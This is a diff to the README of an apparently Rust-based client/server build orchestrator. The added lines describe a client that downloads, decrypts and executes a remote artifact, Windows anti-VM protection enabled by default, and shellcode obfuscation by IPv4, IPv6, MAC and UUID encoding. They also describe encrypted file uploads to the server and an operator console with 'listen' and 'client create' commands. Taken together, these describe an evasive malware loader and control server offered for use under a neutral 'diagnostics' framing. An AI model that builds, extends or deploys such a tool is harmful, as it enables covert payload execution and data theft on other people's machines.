@@ -27,6 +27,11 @@ The current implementation provides:
 - streamed diagnostic uploads encrypted by the client with the build's public key;
 - optional Windows anti-VM protection, enabled by default and disabled with
   `--no-antivm`;
+- optional `obfs` utilities for IPv4, IPv6, MAC and UUID shellcode
+  obfuscation/deobfuscation;
+- a local operator CLI with named users, an interactive console, build history, logs and
+  diagnostic inventory;
+- debug client builds that write diagnostics to `Desktop/RustBuilder-debug/client.log`;
 - Linux-to-Windows client cross-compilation through the `x86_64-pc-windows-gnu` target;
 - server operator commands for builds, logs, and diagnostics.
 
@@ -78,11 +83,16 @@ cargo run -p server -- --db data/orch.db --data-dir data \
   serve --addr 0.0.0.0:8443 --san your-host --san 127.0.0.1
 ```
 
-Run the produced client (found under `data/clients/<build-id>/`):
+Run the produced client (found under `data/clients/<build-id>/`). It downloads and decrypts
+the artifact locally, writes it to `--out`, and then executes it:
 
 ```
 client --out ./decrypted.bin
 ```
+
+If `--out` is omitted, the client uses a file in the system temporary directory. The
+downloaded ciphertext is staged beside the output as `<out>.part` and removed after the
+download attempt.
 
 Upload an encrypted diagnostic file to the server (`POST /builds/:id/diagnostics`, streamed
 in chunks; encrypted with the build's embedded PGP public key, stored server-side as an opaque
@@ -91,6 +101,20 @@ blob under `data/diagnostics/<id>/`):
 ```
 client --upload ./diagnostic.txt
 ```
+
+Upload mode exits after sending the encrypted diagnostic and does not download or execute an
+artifact. The server stores the opaque `.pgp` blob under `data/diagnostics/<build-id>/`.
+
+Initialize local administrative access before using protected server commands:
+
+```
+SERVER_MASTER_PASSPHRASE=... ./target/release/server user create operator
+SERVER_MASTER_PASSPHRASE=... ./target/release/server console
+```
+
+The CLI separately prompts for the application username/password. Administrative access is
+local only; it is not exposed through the HTTP API. Use `help` inside `console` to see
+`builds`, `logs`, `diagnostics`, `listen`, and `client create`.
 
 The client also accepts `--server` and `--build-id` when running a development build;
 generated clients have these values embedded by `build.rs`.
@@ -152,3 +176,7 @@ SERVER_MASTER_PASSPHRASE=... ./target/release/server \
 The TLS backend is `rustls` with the pure-Rust `ring` provider (no `aws-lc-sys`), so the
 Windows client links with only the Rust toolchain plus the mingw-w64 gcc — no MSVC, no
 `cmake`, no `nasm`.
+
+For a development build without anti-VM protection, add `--no-default-features`. The
+orchestrator exposes the same choice as `new-build --no-antivm`; use `--debug` for a native
+debug client and `--obfs` to enable the `obf` subcommand.
